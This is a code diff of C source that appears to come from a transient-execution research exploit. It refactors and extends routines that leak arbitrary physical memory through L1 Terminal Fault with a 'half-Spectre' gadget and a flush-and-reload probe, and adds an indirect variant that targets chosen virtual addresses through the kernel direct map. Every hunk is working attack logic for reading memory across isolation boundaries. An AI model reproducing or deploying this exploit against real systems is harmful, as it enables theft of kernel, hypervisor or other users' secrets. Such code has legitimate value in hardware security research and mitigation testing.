@@ -126,7 +126,7 @@ void l1tf_leak_buffer_free(leak_addr_t *leak) {
   assert(!munmap(leak->leak, PAGE_SIZE));
 }
 
-size_t thijs_l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *reload_buffer, void (*l1tf_leak_function)(void *, reload_buffer_t)) {
+size_t try_l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *reload_buffer, void (*l1tf_leak_function)(void *, reload_buffer_t)) {
   const size_t nr_of_probes = 25;
   const size_t probe_size = AMOUNT_OF_OPTIONS_IN_NIBBLE * sizeof(size_t);
   size_t *probes = malloc(probe_size);
@@ -157,7 +157,7 @@ size_t thijs_l1tf_do_leak_nibblewise_prober(void *leak_addr, reload_buffer_t *re
   return max;
 }
 
-void thijs_l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
+void try_l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
   fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
   fprintf(stderr, "Request leak and reload buffers\n");
 
@@ -185,8 +185,8 @@ void thijs_l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
       for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
         void *leak_addr = (char *)leak.leak + j;
         size_t high =
-            thijs_l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble) & 0xf;
-        size_t low = thijs_l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble) & 0xf;
+            try_l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble) & 0xf;
+        size_t low = try_l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble) & 0xf;
 
         // Count the number of times each result has occured
         results[i][high]++;
@@ -238,14 +238,9 @@ void thijs_l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
 
 }
 
-void thijs_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, const size_t length)
+void try_l1tf_leak_core(char *data, uintptr_t base, const uintptr_t phys_addr, const size_t length)
 {
   assert(0 < length && length <= 64 && (phys_addr & (64-1)) + length <= 64);
-
-	half_spectre_start(base, phys_addr);
-	// half_spectre_start(base, 0x17a101f91000 + (phys_addr-0x9e177000)); TODO IMPLEMENT VIRTUALLY INDEXED HALF-SPECTRE/L1TF
-	// half_spectre_start(base, 0x17a101fa8000 + (phys_addr-0x9e092000));
-
   reload_buffer_t *reload_buffer = l1tf_reload_buffer_create();
 
   leak_addr_t leak = l1tf_leak_buffer_create();
@@ -265,8 +260,8 @@ void thijs_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, cons
     for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
       void *leak_addr = (char *)leak.leak + j;
       size_t high =
-          thijs_l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble) & 0xf;
-      size_t low = thijs_l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble) & 0xf;
+          try_l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_high_nibble) & 0xf;
+      size_t low = try_l1tf_do_leak_nibblewise_prober(leak_addr, reload_buffer, asm_l1tf_leak_low_nibble) & 0xf;
 
       // Count the number of times each result has occured
       results[i][high]++;
@@ -290,13 +285,13 @@ void thijs_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, cons
   }
 
   // // Sanity check using 2-byte granular leakage.
-  // fprintf(stderr, "thijs_l1tf_leak sanity check | data = ");
+  // fprintf(stderr, "try_l1tf_leak sanity check | data = ");
   // display(data, length);
   // for (size_t i = 0; i+1 < length; i++) {
   //   int signal = l1tf_oracle16(*(uint16_t *)(data+i), phys_addr+i, 10000, NULL);
-  //   fprintf(stderr, "thijs_l1tf_leak sanity check |     at data+%2lu, magic %hx, signal = %d\n", i, *(uint16_t *)(data+i), signal);
+  //   fprintf(stderr, "try_l1tf_leak sanity check |     at data+%2lu, magic %hx, signal = %d\n", i, *(uint16_t *)(data+i), signal);
   //   if (!signal) {
-  //     fprintf(stderr, "thijs_l1tf_leak sanity check |         no signal --> retrying\n");
+  //     fprintf(stderr, "try_l1tf_leak sanity check |         no signal --> retrying\n");
   //     goto retry;
   //   }
   // }
@@ -305,6 +300,24 @@ void thijs_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, cons
 
   l1tf_leak_buffer_free(&leak);
   l1tf_reload_buffer_free(reload_buffer);
+}
+
+void try_l1tf_leak(char *data, uintptr_t base, const uintptr_t phys_addr, const size_t length)
+{
+	half_spectre_start(base, phys_addr);
+
+  try_l1tf_leak_core(data, base, phys_addr, length);
+
+	half_spectre_stop();
+}
+
+void try_l1tf_leak_indirectly(char *data, uintptr_t base, const uintptr_t phys_addr, const size_t length, va_t hdm, va_t target_va)
+{
+  // half_spectre_start() touches `hdm + pa`. So instead, now we touch:
+  u64 fake_pa = target_va - hdm;
+	half_spectre_start(base, fake_pa);
+
+  try_l1tf_leak_core(data, base, phys_addr, length);
 
 	half_spectre_stop();
 }
@@ -1060,7 +1073,7 @@ void _l1tf_leak(char *data, uintptr_t base, uintptr_t pa, uintptr_t len)
   for (uintptr_t start = pa; start < pa+len; start = line_end, line_end += 0x40) {
     uintptr_t end = pa+len < line_end ? pa+len : line_end;
     size_t length = end - start;
-    thijs_l1tf_leak(data+i, base, start, length);
+    try_l1tf_leak(data+i, base, start, length);
     i += length;
   }
 }
